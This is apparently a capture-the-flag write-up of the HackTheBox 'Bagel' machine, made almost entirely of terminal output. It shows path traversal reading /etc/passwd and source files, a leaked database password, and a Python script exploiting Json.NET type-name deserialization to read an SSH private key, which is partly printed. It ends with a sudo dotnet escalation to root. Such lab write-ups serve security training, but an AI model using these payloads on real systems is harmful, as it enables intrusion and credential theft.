# HackTheBox Bagel WriteUp

> 原文: https://www.ctfiot.com/118990.html
> ID: 118990


```
┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ sudo nmap -Pn -n -v --reason -sS -p- --min-rate=1000 -A 10.10.11.201 -oN nmap.log

PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack ttl 63 OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey:
| 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)
|_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)
5000/tcp open upnp? syn-ack ttl 63
| fingerprint-strings:
| GetRequest:
| HTTP/1.1 400 Bad Request
8000/tcp open http-alt syn-ack ttl 63 Werkzeug/2.2.2 Python/3.10.9
| GetRequest:
| HTTP/1.1 302 FOUND
| Server: Werkzeug/2.2.2 Python/3.10.9
┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ curl http://bagel.htb:
8000?page=../../../etc/passwd
File not found
┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ curl http://bagel.htb:
8000?page=../../../../../../etc/passwd
root:x:0:0:
root:/root:/bin/bash
developer:x:
1000:
1000::/home/developer:/bin/bash
phil:x:
1001:
1001::/home/phil:/bin/bash
┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ curl http://bagel.htb:
8000?page=../../../../../../proc/self/cmdline --output cmdline

┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ cat cmdline
python3/home/developer/app/app.py
┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ curl http://bagel.htb:
8000?page=../../../../../../home/developer/app/app.py --output app.py

┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ cat app.py
from flask import Flask, request, send_file, redirect, Response
import os.path
import websocket,json

app = Flask(__name__)

@app.route('/')
def index():
 if 'page' in request.args:
 page = 'static/'+request.args.get('page')
 if os.path.isfile(page):
 resp=send_file(page)
 resp.direct_passthrough = False
 if os.path.getsize(page) == 0:
 resp.headers["Content-Length"]=str(len(resp.get_data()))
 return resp
 else:
 return "File not found"
 else:
 return redirect('http://bagel.htb:
8000/?page=index.html', code=302)

@app.route('/orders')
def order(): # don't forget to run the order app first with "dotnet " command. Use your ssh key to access the machine.
 try:
 ws = websocket.WebSocket()
 ws.connect("ws://127.0.0.1:
5000/") # connect to order app
 order = {"ReadOrder":"orders.txt"}
 data = str(json.dumps(order))
 ws.send(data)
 result = ws.recv()
 return(json.loads(result)['ReadOrder'])
 
except:
 return("Unable to connect")

if __name__ == '__main__':
 app.run(host='0.0.0.0', port=8000)
ws = websocket.WebSocket()
ws.connect("ws://127.0.0.1:
5000/") # connect to order app
order = {"ReadOrder":"orders.txt"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
return(json.loads(result)['ReadOrder'])
┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ cat test.py
#!/usr/bin/python3

import websocket, json

ws = websocket.WebSocket()
ws.connect("ws://10.10.11.201:
5000")
order = {"ReadOrder":"orders.txt"}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)
┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ python3 test.py
{
 "UserId": 0,
 "Session": "Unauthorized",
 "Time": "4:50:54",
 "RemoveOrder": null,
 "WriteOrder": null,
 "ReadOrder": "order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] \n"
}
# don't forget to run the order app first with "dotnet " command. Use your ssh key to access the machine.
┌──(kali㉿kali)-[~/Desktop/Bagle]
└─$ for i in $(seq 1 1000); do curl http://bagel.htb:
8000?page=../../../../../../../proc/$i/cmdline -o -; echo ":
PID = $i"; done
...
File not found:
PID = 888
File not found:
PID = 889
/usr/sbin/NetworkManager--no-daemon:
PID = 890
File not found:
PID = 891
dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll:
PID = 892
File not found:
PID = 893
python3/home/developer/app/app.py:
PID = 894
/usr/sbin/irqbalance--foreground:
PID = 895
...
┌──(kali㉿kali)-[~/Desktop/Bagel]
└─$ curl http://bagel.htb:
8000?page=../../../../../../../opt/bagel/bin/Debug/net6.0/bagel.dll --output bagel.dll
using System;
using Microsoft.Data.SqlClient;

namespace bagel_server
{
 // Token: 0x0200000A RID: 10
 public class DB
 {
 // Token: 0x06000022 RID: 34 RVA: 0x00002518 File Offset: 0x00000718
 [Obsolete("The production team has to decide where the database server will be hosted. This method is not fully implemented.")]
 public void DB_connection()
 {
 string text = "Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K";
 SqlConnection sqlConnection = new SqlConnection(text);
 }
 }
}
namespace bagel_server
{
 // Token: 0x02000005 RID: 5
 [NullableContext(1)]
 [Nullable(0)]
 public class Handler
 {
 // Token: 0x06000005 RID: 5 RVA: 0x00002094 File Offset: 0x00000294
 public object Serialize(object obj)
 {
 return JsonConvert.SerializeObject(obj, 1, new JsonSerializerSettings
 {
 TypeNameHandling = 4
 });
 }

 // Token: 0x06000006 RID:6 RVA: 0x000020BC File Offset: 0x000002BC
 public object Deserialize(string json)
 {
 object result;
 try
 {
 result = JsonConvert.DeserializeObeject(json, new JsonSerializerSettings
 {
 TypeNameHandling = 4
 });
 }
 catch
 {
 result = "{¥"Message¥":¥"unknown¥"}";
 }
 return result;
 }
 }
}
public class Orders
{
 private string order_filename;
 private string order_info;
 private File file = new File();
 public object RemoveOrder {get; set;}
 public string WriteOrder
 {
 get
 {
 return file.WriteFile;
 }
 set
 {
 order_info = value;
 file.WriteFile = order_info;
 }
 }
 public string ReadOrder
 {
 get
 {
 return file.ReadFile;
 }
 set
 {
 order_filename = value;
 order_filename = order_filename.Replace("/", "");
 order_filename = order_filename.Replace("..", "");
 file.ReadFile = order_filename;
 }
 }
}
┌──(kali㉿kali)-[~/Desktop/Bagel]
└─$ cat ssh.py
#!/usr/bin/python3
import websocket, json
ws = websocket.WebSocket()
ws.connect("ws://10.10.11.201:
5000/")
order = { "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}
data = str(json.dumps(order))
ws.send(data)
result = ws.recv()
print(result)
┌──(kali㉿kali)-[~/Desktop/Bagel]
└─$ python3 ssh.py
{
 "UserId": 0,
 "Session": "Unauthorized",
 "Time": "7:24:12",
 "RemoveOrder": {
 "$type": "bagel_server.File, bagel",
 "ReadFile": "-----BEGIN OPENSSH PRIVATE KEY-----\n
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAu
hIcD7KiWMN8eMlmhdKLDclnn0bXShuMjBYpL5qdhw8m1Re3Ud+2\ns8SIkkk0KmIYED3c7aSC8C74FmvSDxTtNOd3T/
iePRZOBf5CW3gZapHh+mNOrSZk13F28N\ndZiev5vBubKayIfcG8QpkIPbfqwXhKR+qCsfqS//bAMtyHkNn3n9cg7Zr
hufiYCkg9jBjO\nZL4+rw4UyWsONsTdvil6tlc41PXyETJat6dTHSHTKz+S7lL4wR/I+saVvj8KgoYtDCE1sV\nVftU
ZhkFImSL2ApxIv7tYmeJbombYff1SqjHAkdX9VKA0gM0zS7but3/klYq6g3l+NEZOC\nM0/I+30oaBoXCjvupMswiY/
oV9UF7HNruDdo06hEu0ymAoGninXaph+ozjdY17PxNtqFfT\neYBgBoiRW7hnY3cZpv3dLqzQiEqHlsnx2ha/A8UhvL
qYA6PfruLEMxJVoDpmvvn9yFWxU1\nYvkqYaIdirOtX/h25gvfTNvlzxuwNczjS7gGP4XDAAAFgA50jZ4OdI2eAAAAB
3NzaC1yc2\nEAAAGBALoSHA+yoljDfHjJZoXSiw3JZ59G10objIwWKS+anYcPJtUXt1HftrPEiJJJNCpi\nGBA93O2k
gvAu+BZr0g8U7TTnd0/4nj0WTgX+Qlt4GWqR4fpjTq0mZNdxdvDXWYnr+bwbmy\nmsiH3BvEKZCD236sF4SkfqgrH6k
v/2wDLch5DZ95/XIO2a4bn4mApIPYwYzmS+Pq8OFMlr\nDjbE3b4perZXONT18hEyWrenUx0h0ys/ku5S+MEfyPrGlb
4/CoKGLQwhNbFVX7VGYZBSJk\ni9gKcSL+7WJniW6Jm2H39UqoxwJHV/VSgNIDNM0u27rd/5JWKuoN5fjRGTgjNPyPt
9KGga\nFwo77qTLMImP6FfVBexza7g3aNOoRLtMpgKBp4p12qYfqM43WNez8TbahX03mAYAaIkVu4\nZ2N3Gab93S6s
0IhKh5bJ8doWvwPFIby6mAOj367ixDMSVaA6Zr75/chVsVNWL5KmGiHYqz\nrV/4duYL30zb5c8bsDXM40u4Bj+FwwA
AAAMBAAEAAAGABzEAtDbmTvinykHgKgKfg6OuUx\nU+DL5C1WuA/QAWuz44maOmOmCjdZA1M+vmzbzU+NRMZtYJhls\n
-----END OPENSSH PRIVATE KEY-----",
 "WriteFile": null
 },
 "WriteOrder": null,
 "ReadOrder": null
}
┌──(kali㉿kali)-[~/Desktop/Bagel]
└─$ ssh -i id_rsa phil@10.10.11.201
Last login: Tue Feb 14 11:47:33 2023 from 10.10.14.19
[phil@bagel ~]$ whoami
phil
[phil@bagel ~]$ ls -l
total 4
-rw-r-----. 1 root phil 33 Jun 3 18:25 user.txt
[phil@bagel ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

 #1) Respect the privacy of others.
 #2) Think before you type.
 #3) With great power comes great responsibility.

[sudo] password for phil:
[phil@bagel home]$ ls -l
total 8
drwx------. 5 developer developer 4096 Jan 20 14:16 developer
drwx------. 4 phil phil 4096 Jan 20 14:14 phil
[phil@bagel home]$ su developer
Password:
[developer@bagel home]$ whoami
developer
[developer@bagel home]$ sudo -l
Matching Defaults entries for developer on bagel:
 !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME
 HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
 LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
 env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin

User developer may run the following commands on bagel:
 (root) NOPASSWD: /usr/bin/dotnet
[developer@bagel ~]$ sudo dotnet fsi

Welcome to .NET 6.0!
---------------------
SDK Version: 6.0.113

----------------
Installed an ASP.NET Core HTTPS development certificate.
To trust the certificate run 'dotnet dev-certs https --trust' (Windows and macOS only).
Learn about HTTPS: https://aka.ms/dotnet-https
----------------
Write your first app: https://aka.ms/dotnet-hello-world
Find out whats new: https://aka.ms/dotnet-whats-new
Explore documentation: https://aka.ms/dotnet-docs
Report issues and find source on GitHub: https://github.com/dotnet/core
Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli
--------------------------------------------------------------------------------------

Microsoft (R) F
# Interactive version 12.0.0.0 for F
# 6.0
Copyright (c) Microsoft Corporation. All Rights Reserved.

For help type #help;;

> System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
sh-5.2
# whoami
root
sh-5.2
# ls -l /root
total 24
-rw-------. 1 root root 1105 Oct 22 2022 anaconda-ks.cfg
-rwxr-xr-x. 1 root root 16200 Oct 23 2022 bagel
-rw-r-----. 1 root root 33 Jun 3 18:25 root.txt
```
